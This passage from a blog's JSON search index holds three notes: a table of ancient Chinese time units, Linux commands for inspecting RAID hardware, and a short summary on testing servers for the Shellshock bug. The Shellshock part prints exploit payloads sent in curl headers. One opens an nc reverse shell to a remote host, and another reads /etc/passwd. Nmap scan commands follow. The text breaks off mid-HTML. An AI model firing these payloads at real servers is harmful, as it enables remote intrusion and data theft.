辰時 食時 07:00-09:00 辰初 07:00\n辰正 08:00 早食、宴食、蚤食 巳時 隅中 09:00-11:00 巳初 09:00\n巳正 10:00 日隅、禺中、日禺 午時 日中 11:00-13:00 午初 11:00\n午正 12:00 日正、日午、日高、正午、中午、亭午、日當午、平午、平晝 未時 日昳 13:00-15:00 未初 13:00\n未正 14:00 日昃、日仄、日側、日跌、日斜、日映、日央 申時 晡時 15:00-17:00 申初 15:00\n申正 16:00 餔時、日餔、日晡、日鋪、日稷、日夕、夕食 酉時 日入 17:00-19:00 酉初 17:00\n酉正 18:00 日沒、日沉、日西、日落、日逝、日晏、日旴、日晦、傍晚 戌時 黃昏 19:00-21:00 戌初 19:00\n戌正 20:00 日夕、日末、日暮、日晚、日闇、日墮、日暗、日曛、曛黃 亥時 人定 21:00-23:00 亥初 21:00\n亥正 22:00 定昏、夤夜 更 漢代皇宮中值班人員分五個班次，按時更換，叫「五更」，由此古人把便把一夜分為五更，每更為一個時辰。 戌時為一更，亥時為二更，子時為三更，丑時為四更，寅時為五更\n更名 時辰 時間 一更天 戌時 19：00－21：00 二更天 亥時 21：00－23：00 三更天 子時 23：00－01：00 四更天 丑時 01：00－03：00 五更天 寅時 03：00－05：00 點 古代使用銅壺滴漏計時，以下漏擊點為名。每更分為五點，故每點合為現在的 24 分鐘。\n","date":"November 29, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20221129-ancient-time-unit/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://wywu.pixnet.net/blog/posts/1022354528\" target=\"_blank\" rel=\"noopener\"\u003e古代計時單位\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"十二時辰時間對照表\"\u003e十二時辰時間對照表\u003c/h5\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e時辰\u003c/th\u003e\n          \u003cth\u003e古名\u003c/th\u003e\n          \u003cth\u003e對應現代時間\u003c/th\u003e\n          \u003cth\u003e初 / 正時間\u003c/th\u003e\n          \u003cth\u003e別名（完整）\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e子時\u003c/td\u003e\n          \u003ctd\u003e夜半\u003c/td\u003e\n          \u003ctd\u003e23:00-01:00\u003c/td\u003e\n          \u003ctd\u003e子初 23:00\u003cbr\u003e子正 00:00\u003c/td\u003e\n          \u003ctd\u003e子夜、中夜、午夜、夜分、夜半、未旦、宵分、未央\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e丑時\u003c/td\u003e\n          \u003ctd\u003e雞鳴\u003c/td\u003e\n          \u003ctd\u003e01:00-03:00\u003c/td\u003e\n          \u003ctd\u003e丑初 01:00\u003cbr\u003e丑正 02:00\u003c/td\u003e\n          \u003ctd\u003e荒雞\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e寅時\u003c/td\u003e\n          \u003ctd\u003e平旦\u003c/td\u003e\n          \u003ctd\u003e03:00-05:00\u003c/td\u003e\n          \u003ctd\u003e寅初 03:00\u003cbr\u003e寅正 04:00\u003c/td\u003e\n          \u003ctd\u003e平明、旦明、黎明、早旦、日旦、昧旦、騎旦、早晨、早夜、早朝、昧爽、旦日、旦時\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e卯時\u003c/td\u003e\n          \u003ctd\u003e日出\u003c/td\u003e\n          \u003ctd\u003e05:00-07:00\u003c/td\u003e\n          \u003ctd\u003e卯初 05:00\u003cbr\u003e卯正 06:00\u003c/td\u003e\n          \u003ctd\u003e日上、日生、日升、日始、日晞、旭日、破曉\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e辰時\u003c/td\u003e\n          \u003ctd\u003e食時\u003c/td\u003e\n          \u003ctd\u003e07:00-09:00\u003c/td\u003e\n          \u003ctd\u003e辰初 07:00\u003cbr\u003e辰正 08:00\u003c/td\u003e\n          \u003ctd\u003e早食、宴食、蚤食\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e巳時\u003c/td\u003e\n          \u003ctd\u003e隅中\u003c/td\u003e\n          \u003ctd\u003e09:00-11:00\u003c/td\u003e\n          \u003ctd\u003e巳初 09:00\u003cbr\u003e巳正 10:00\u003c/td\u003e\n          \u003ctd\u003e日隅、禺中、日禺\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e午時\u003c/td\u003e\n          \u003ctd\u003e日中\u003c/td\u003e\n          \u003ctd\u003e11:00-13:00\u003c/td\u003e\n          \u003ctd\u003e午初 11:00\u003cbr\u003e午正 12:00\u003c/td\u003e\n          \u003ctd\u003e日正、日午、日高、正午、中午、亭午、日當午、平午、平晝\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e未時\u003c/td\u003e\n          \u003ctd\u003e日昳\u003c/td\u003e\n          \u003ctd\u003e13:00-15:00\u003c/td\u003e\n          \u003ctd\u003e未初 13:00\u003cbr\u003e未正 14:00\u003c/td\u003e\n          \u003ctd\u003e日昃、日仄、日側、日跌、日斜、日映、日央\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e申時\u003c/td\u003e\n          \u003ctd\u003e晡時\u003c/td\u003e\n          \u003ctd\u003e15:00-17:00\u003c/td\u003e\n          \u003ctd\u003e申初 15:00\u003cbr\u003e申正 16:00\u003c/td\u003e\n          \u003ctd\u003e餔時、日餔、日晡、日鋪、日稷、日夕、夕食\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e酉時\u003c/td\u003e\n          \u003ctd\u003e日入\u003c/td\u003e\n          \u003ctd\u003e17:00-19:00\u003c/td\u003e\n          \u003ctd\u003e酉初 17:00\u003cbr\u003e酉正 18:00\u003c/td\u003e\n          \u003ctd\u003e日沒、日沉、日西、日落、日逝、日晏、日旴、日晦、傍晚\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e戌時\u003c/td\u003e\n          \u003ctd\u003e黃昏\u003c/td\u003e\n          \u003ctd\u003e19:00-21:00\u003c/td\u003e\n          \u003ctd\u003e戌初 19:00\u003cbr\u003e戌正 20:00\u003c/td\u003e\n          \u003ctd\u003e日夕、日末、日暮、日晚、日闇、日墮、日暗、日曛、曛黃\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e亥時\u003c/td\u003e\n          \u003ctd\u003e人定\u003c/td\u003e\n          \u003ctd\u003e21:00-23:00\u003c/td\u003e\n          \u003ctd\u003e亥初 21:00\u003cbr\u003e亥正 22:00\u003c/td\u003e\n          \u003ctd\u003e定昏、夤夜\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch5 id=\"更\"\u003e更\u003c/h5\u003e\n\u003cp\u003e漢代皇宮中值班人員分五個班次，按時更換，叫「五更」，由此古人把便把一夜分為五更，每更為一個時辰。\n戌時為一更，亥時為二更，子時為三更，丑時為四更，寅時為五更\u003c/p\u003e","tags":["URL","Time"],"title":"古代計時單位"},{"categories":["URL","Linux","RAID","command line"],"contents":" How to Detect RAID Information in Linux lspci lspci | grep RAID 00:1f.2 RAID bus controller: Intel Corporation 82801 Mobile SATA Controller [RAID mode] (rev 04) lshw lshw -class storage *-raid description: RAID bus controller product: 82801 Mobile SATA Controller [RAID mode] vendor: Intel Corporation physical id: 1f.2 bus info: pci@0000:00:1f.2 logical name: scsi0 version: 04 width: 32 bits clock: 66MHz capabilities: raid msi pm bus_master cap_list emulated configuration: driver=ahci latency=0 resources: irq:26 ioport:f0d0(size=8) ioport:f0c0(size=4) ioport:f0b0(size=8) ioport:f0a0(size=4) ioport:f060(size=32) memory:f7e36000-f7e367ff smartctl dmesg | grep -i scsi [ 0.210852] SCSI subsystem initialized [ 0.341280] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 243) ... [ 1.213299] scsi 0:0:0:0: Direct-Access ATA ST320LT012-9WS14 YAM1 PQ: 0 ANSI: 5 [ 1.319886] sd 0:0:0:0: [sda] Attached SCSI disk [ 19.571008] sd 0:0:0:0: Attached scsi generic sg0 type 0 smartctl --all /dev/sda Model Family: Seagate Laptop HDD Device Model: ST320LT012-9WS14C Serial Number: S0V3R9LL LU WWN Device Id: 5 000c50 05be4653c Firmware Version: 0001YAM1 User Capacity: 320,072,933,376 bytes [320 GB] Sector Sizes: 512 bytes logical, 4096 bytes physical Rotation Rate: 5400 rpm Form Factor: 2.5 inches Device is: In smartctl database 7.3/5319 ATA Version is: ATA8-ACS T13/1699-D revision 4 SATA Version is: SATA 2.6, 3.0 Gb/s (current: 3.0 Gb/s) Local Time is: Sat Nov 19 20:52:01 2022 PKT SMART support is: Available - device has SMART capability. SMART support is: Enabled ... MegaCLI megacli -LDInfo -Lall -aALL Adapter 0 -- Virtual Drive Information: Virtual Drive: 0 (Target Id: 0) Name : SEAGATE RAID Level : Primary-1, Secondary-0, RAID Level Qualifier-0 Size : 320 GB Sector Size : 512 Mirror Data : 320 GB State : Optimal ... lsscsi lsscsi [0:0:0:0] disk ATA ST320LT012-9WS14 YAM1 /dev/sda Vendor-Specific Tools omreport storage vdisk List of Virtual Disks in the System Controller SEAGATE Laptop HDD ID : 0 Status : Ok Name : SEAGATE State : Ready Hot Spare Policy violated : Not Assigned Encrypted : No Layout : RAID-0 Size : 320.00 GB (343597383680 bytes) T10 Protection Information Status : No Associated Fluid Cache State : Not Applicable Device Name : /dev/sda Bus Protocol : ATA Media : HDD Read Policy : Adaptive Read Ahead Write Policy : Write Back Cache Policy : Not Applicable Stripe Element Size : 128 KB Disk Cache Policy : Enabled ","date":"November 28, 2022","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20221128-raid-information-command-line/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.baeldung.com/linux/raid-information-command-line\" target=\"_blank\" rel=\"noopener\"\u003eHow to Detect RAID Information in Linux\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"lspci\"\u003elspci\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003elspci | grep RAID\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e00:1f.2 RAID bus controller: Intel Corporation \u003cspan style=\"color:#ae81ff\"\u003e82801\u003c/span\u003e Mobile SATA Controller \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eRAID mode\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003erev 04\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"lshw\"\u003elshw\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003elshw -class storage\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  *-raid\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       description: RAID bus controller\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       product: \u003cspan style=\"color:#ae81ff\"\u003e82801\u003c/span\u003e Mobile SATA Controller \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eRAID mode\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       vendor: Intel Corporation\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       physical id: 1f.2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       bus info: pci@0000:00:1f.2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       logical name: scsi0\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       version: \u003cspan style=\"color:#ae81ff\"\u003e04\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       width: \u003cspan style=\"color:#ae81ff\"\u003e32\u003c/span\u003e bits\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       clock: 66MHz\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       capabilities: raid msi pm bus_master cap_list emulated\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       configuration: driver\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eahci latency\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       resources: irq:26 ioport:f0d0\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003esize\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e8\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e ioport:f0c0\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003esize\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e4\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e ioport:f0b0\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003esize\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e8\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e ioport:f0a0\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003esize\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e4\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e ioport:f060\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003esize\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e32\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e memory:f7e36000-f7e367ff\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"smartctl\"\u003esmartctl\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edmesg | grep -i scsi\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e    0.210852\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e SCSI subsystem initialized\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e    0.341280\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Block layer SCSI generic \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ebsg\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e driver version 0.4 loaded \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003emajor 243\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e    1.213299\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e scsi 0:0:0:0: Direct-Access     ATA      ST320LT012-9WS14 YAM1 PQ: \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e ANSI: \u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e    1.319886\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e sd 0:0:0:0: \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003esda\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Attached SCSI disk\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e   19.571008\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e sd 0:0:0:0: Attached scsi generic sg0 type \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmartctl --all /dev/sda\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eModel Family:     Seagate Laptop HDD\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDevice Model:     ST320LT012-9WS14C\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSerial Number:    S0V3R9LL\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eLU WWN Device Id: \u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e 000c50 05be4653c\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eFirmware Version: 0001YAM1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eUser Capacity:    320,072,933,376 bytes \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e320\u003c/span\u003e GB\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSector Sizes:     \u003cspan style=\"color:#ae81ff\"\u003e512\u003c/span\u003e bytes logical, \u003cspan style=\"color:#ae81ff\"\u003e4096\u003c/span\u003e bytes physical\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eRotation Rate:    \u003cspan style=\"color:#ae81ff\"\u003e5400\u003c/span\u003e rpm\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eForm Factor:      2.5 inches\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDevice is:        In smartctl database 7.3/5319\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eATA Version is:   ATA8-ACS T13/1699-D revision \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSATA Version is:  SATA 2.6, 3.0 Gb/s \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ecurrent: 3.0 Gb/s\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eLocal Time is:    Sat Nov \u003cspan style=\"color:#ae81ff\"\u003e19\u003c/span\u003e 20:52:01 \u003cspan style=\"color:#ae81ff\"\u003e2022\u003c/span\u003e PKT\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMART support is: Available - device has SMART capability.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMART support is: Enabled\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"megacli\"\u003eMegaCLI\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emegacli -LDInfo -Lall -aALL\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAdapter \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e -- Virtual Drive Information:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eVirtual Drive: \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eTarget Id: 0\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eName                : SEAGATE\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eRAID Level          : Primary-1, Secondary-0, RAID Level Qualifier-0\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSize                : \u003cspan style=\"color:#ae81ff\"\u003e320\u003c/span\u003e GB\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSector Size         : \u003cspan style=\"color:#ae81ff\"\u003e512\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eMirror Data         : \u003cspan style=\"color:#ae81ff\"\u003e320\u003c/span\u003e GB\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eState               : Optimal\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"lsscsi\"\u003elsscsi\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003elsscsi\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e0:0:0:0\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e    disk    ATA      ST320LT012-9WS14 YAM1  /dev/sda\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"vendor-specific-tools\"\u003eVendor-Specific Tools\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eomreport storage vdisk\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eList of Virtual Disks in the System\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eController SEAGATE Laptop HDD\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eID                                : \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eStatus                            : Ok\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eName                              : SEAGATE\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eState                             : Ready\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eHot Spare Policy violated         : Not Assigned\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eEncrypted                         : No\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eLayout                            : RAID-0\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSize                              : 320.00 GB \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e343597383680\u003c/span\u003e bytes\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eT10 Protection Information Status : No\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAssociated Fluid Cache State      : Not Applicable\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDevice Name                       : /dev/sda\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eBus Protocol                      : ATA\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eMedia                             : HDD\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eRead Policy                       : Adaptive Read Ahead\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eWrite Policy                      : Write Back\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCache Policy                      : Not Applicable\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eStripe Element Size               : \u003cspan style=\"color:#ae81ff\"\u003e128\u003c/span\u003e KB\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDisk Cache Policy                 : Enabled\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Linux","RAID","command line"],"title":"How to Detect RAID Information in Linux"},{"categories":["URL","Linux","SHELL","command line"],"contents":" Test Whether a Server Is Vulnerable to Shellshock Bug The Shellshock Bug env x=\u0026#39; () {:;};\u0026#39; Exploiting Shellshock Bug A substituted command is executed since the feature ignores the command specified by the user, and instead, it runs that which the ForceCommand defines. The ignored commands from the user are put in the \u0026ldquo;SSH_ORIGINAL_COMMAND\u0026rdquo; environment variable. If the user\u0026rsquo;s default shell is Bash, the Bash shell will parse the value of the \u0026ldquo;SSH_ORIGINAL_COMMAND\u0026rdquo; environment variable on start-up and run the embedded commands. Examples of Shellshock Exploit Commands ## 1 curl -H \u0026#34;X-Frame-Options: () {:;};echo;/bin/nc -e /bin/bash 192.168.y.y 443\u0026#34; 192.168.x.y/CGI-bin/hello.cgi ## 2 curl --insecure 192.168.x.x -H \u0026#34;User-Agent: () { :; }; /bin/cat /etc/passwd\u0026#34; use nmap script to test for the vulnerability nmap -sV -p- --script http-shellshock 192.168.x.x nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls 192.168.x.x ","date":"November 28, 2022","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20221128-linux-shellshock-bug/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.baeldung.com/linux/shellshock-bug\" target=\"_blank\" rel=\"noopener\"\u003eTest Whether a Server Is Vulnerable to Shellshock Bug\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"the-shellshock-bug\"\u003eThe Shellshock Bug\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" 